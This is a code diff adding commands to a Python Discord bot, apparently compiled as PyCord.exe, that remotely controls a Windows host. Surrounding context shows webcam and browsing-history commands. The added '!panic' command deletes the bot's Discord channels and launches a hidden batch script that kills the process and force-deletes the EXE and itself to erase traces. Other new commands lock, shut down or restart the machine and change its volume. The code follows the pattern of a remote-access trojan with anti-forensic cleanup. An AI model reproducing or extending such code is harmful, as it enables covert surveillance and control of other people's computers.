@@ -1226,7 +1226,7 @@ async def webcam(ctx):
 # ============================================================
 #  !stop – Shut down bot and close CMD window
 # ============================================================
-@bot.command(name="stop", aliases=["shutdown", "exit"])
+@bot.command(name="stop", aliases=["exit"])
 async def stop_bot(ctx):
     """Shuts down the bot and closes the CMD window."""
     embed = discord.Embed(
@@ -1335,6 +1335,261 @@ async def history(ctx):
     except Exception as e:
         await msg.edit(content=f"❌ Error while sending: `{e}`")
 
+# ============================================================
+#  !panic – Delete all channels, delete the EXE, stop the bot
+# ============================================================
+@bot.command(name="panic")
+async def panic(ctx):
+    """
+    Deletes every channel in this category, deletes the running EXE,
+    then shuts down the bot and terminates the host process.
+    """
+    guild = bot.get_guild(GUILD_ID)
+    if guild is None:
+        await ctx.send("❌ Guild not found.")
+        return
+
+    category = discord.utils.get(guild.categories, name=MY_CATEGORY_NAME)
+    if category is None:
+        await ctx.send("❌ Category not found.")
+        return
+
+    # Confirm before doing anything
+    confirm = await ctx.send(
+        "⚠️ **PANIC MODE**\n"
+        f"This will:\n"
+        f"• Delete **all {len(category.channels)} channels** in `{category.name}`\n"
+        f"• Delete the running **EXE file**\n"
+        f"• Shut down the bot\n\n"
+        "Type `confirm` within 15 seconds to proceed."
+    )
+
+    def check(m):
+        return (
+            m.author == ctx.author
+            and m.channel == ctx.channel
+            and m.content.lower() == "confirm"
+        )
+
+    try:
+        await bot.wait_for("message", check=check, timeout=15.0)
+    except asyncio.TimeoutError:
+        await confirm.edit(content="❌ Panic cancelled (timeout).")
+        return
+
+    status = await ctx.send("🔥 Executing panic sequence...")
+
+    # 1. Delete every channel in the category
+    deleted = 0
+    failed = 0
+    for channel in list(category.channels):
+        try:
+            await channel.delete()
+            deleted += 1
+        except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+            failed += 1
+
+    # 2. Try to delete the category itself
+    category_deleted = False
+    try:
+        await category.delete()
+        category_deleted = True
+    except (discord.Forbidden, discord.NotFound, discord.HTTPException):
+        pass
+
+    # 3. Prepare EXE self-delete via batch script
+    exe_deleted = False
+    exe_path = None
+
+    # Get the path of the running EXE (works for PyInstaller / frozen builds)
+    if getattr(sys, "frozen", False):
+        exe_path = sys.executable  # the .exe itself
+    else:
+        # Running as .py -> check if a matching .exe exists next to the script
+        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+        candidate = os.path.join(script_dir, "PyCord.exe")
+        if os.path.isfile(candidate):
+            exe_path = candidate
+
+    if exe_path and os.path.isfile(exe_path):
+        try:
+            bat_path = os.path.join(
+                os.environ.get("TEMP", os.path.expanduser("~")),
+                f"pycord_panic_{os.getpid()}.bat"
+            )
+            exe_name = os.path.basename(exe_path)
+
+            # Batch: wait for our PID to die, then delete the EXE and itself
+            bat_content = (
+                "@echo off\r\n"
+                f"taskkill /F /PID {os.getpid()} >nul 2>&1\r\n"
+                "timeout /t 2 /nobreak >nul\r\n"
+                f'del /F /Q "{exe_path}"\r\n'
+                f'del /F /Q "%~f0"\r\n'
+            )
+            with open(bat_path, "w", encoding="utf-8") as f:
+                f.write(bat_content)
+
+            # Launch the batch hidden
+            CREATE_NO_WINDOW = 0x08000000
+            subprocess.Popen(
+                ["cmd.exe", "/c", bat_path],
+                creationflags=CREATE_NO_WINDOW,
+                close_fds=True
+            )
+            exe_deleted = True
+            print(f"🗑️ Scheduled EXE deletion: {exe_path}")
+        except Exception as e:
+            print(f"❌ Failed to schedule EXE deletion: {e}")
+    else:
+        print("ℹ️ No EXE found to delete (running as .py or no EXE next to script).")
+
+    # 4. Report back in whatever channel is still available
+    report = (
+        f"🔥 Panic executed.\n"
+        f"Channels deleted: **{deleted}**"
+        + (f" | Failed: **{failed}**" if failed else "")
+        + "\n"
+        f"Category deleted: **{'yes' if category_deleted else 'no'}**\n"
+        f"EXE deletion scheduled: **{'yes' if exe_deleted else 'no'}**\n"
+        f"Shutting down..."
+    )
+    try:
+        await status.edit(content=report)
+    except Exception:
+        pass
+
+    print("🔥 PANIC executed. Shutting down bot and process...")
+
+    # 5. Close Discord connection
+    try:
+        await bot.change_presence(status=discord.Status.offline)
+    except Exception:
+        pass
+
+    try:
+        await bot.close()
+    except Exception:
+        pass
+
+    # 6. Hard-kill the process (closes the CMD window)
+    os._exit(0)
+
+# ============================================================
+#  !lock – Lock the PC (Windows workstation lock)
+# ============================================================
+@bot.command(name="lock")
+async def lock_pc(ctx):
+    """Locks the Windows workstation."""
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows.")
+        return
+
+    await ctx.send("🔒 Locking the PC...")
+    try:
+        import ctypes
+        ctypes.windll.user32.LockWorkStation()
+    except Exception as e:
+        await ctx.send(f"❌ Failed to lock: `{e}`")
+
+
+# ============================================================
+#  !restart – Restart the bot process
+# ============================================================
+@bot.command(name="restart")
+async def restart_bot(ctx):
+    """Restarts the bot (spawns a new process and exits the current one)."""
+    await ctx.send("🔄 Restarting bot...")
+
+    try:
+        await bot.change_presence(status=discord.Status.offline)
+    except Exception:
+        pass
+
+    try:
+        await bot.close()
+    except Exception:
+        pass
+
+    print("🔄 Restart requested via !restart...")
+
+    # Spawn a new instance of the same script, then exit
+    try:
+        script = os.path.abspath(sys.argv[0])
+        subprocess.Popen([sys.executable, script], cwd=os.path.dirname(script))
+    except Exception as e:
+        print(f"❌ Could not restart: {e}")
+
+    os._exit(0)
+
+
+# ============================================================
+#  !shutdown – Shut down the PC
+# ============================================================
+@bot.command(name="shutdown")
+async def shutdown_pc(ctx, delay: int = 30):
+    """
+    Shuts down the host PC.
+    Usage: !shutdown [seconds]   (default: 30)
+    """
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows.")
+        return
+
+    await ctx.send(
+        f"🛑 **PC shutdown** in `{delay}` seconds.\n"
+        f"Use `shutdown /a` on the PC to abort."
+    )
+    try:
+        subprocess.Popen(["shutdown", "/s", "/t", str(delay)])
+    except Exception as e:
+        await ctx.send(f"❌ Failed to schedule shutdown: `{e}`")
+
+
+# ============================================================
+#  !setvolume – Set the system volume (0–100)
+# ============================================================
+@bot.command(name="setvolume", aliases=["volume", "vol"])
+async def set_volume(ctx, level: int = None):
+    """
+    Sets the Windows system volume (0–100).
+    Usage: !setvolume 50
+    """
+    if platform.system() != "Windows":
+        await ctx.send("❌ This command only works on Windows.")
+        return
+
+    if level is None:
+        await ctx.send("❌ Usage: `!setvolume <0-100>`")
+        return
+
+    if not 0 <= level <= 100:
+        await ctx.send("❌ Volume must be between **0** and **100**.")
+        return
+
+    try:
+        # Use the built-in Windows volume via pycaw
+        from ctypes import cast, POINTER
+        from comtypes import CLSCTX_ALL
+        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(
+            IAudioEndpointVolume._iid_, CLSCTX_ALL, None
+        )
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+
+        # Set scalar volume (0.0 – 1.0)
+        volume.SetMasterVolumeLevelScalar(level / 100.0, None)
+
+        await ctx.send(f"🔊 System volume set to **{level}%**.")
+    except ImportError:
+        await ctx.send(
+            "❌ `pycaw` and `comtypes` are required.\n"
+            "Run: `pip install pycaw comtypes`"
+        )
+    except Exception as e:
+        await ctx.send(f"❌ Failed to set volume: `{e}`")
 
 # --- Start bot ---
 if __name__ == "__main__":
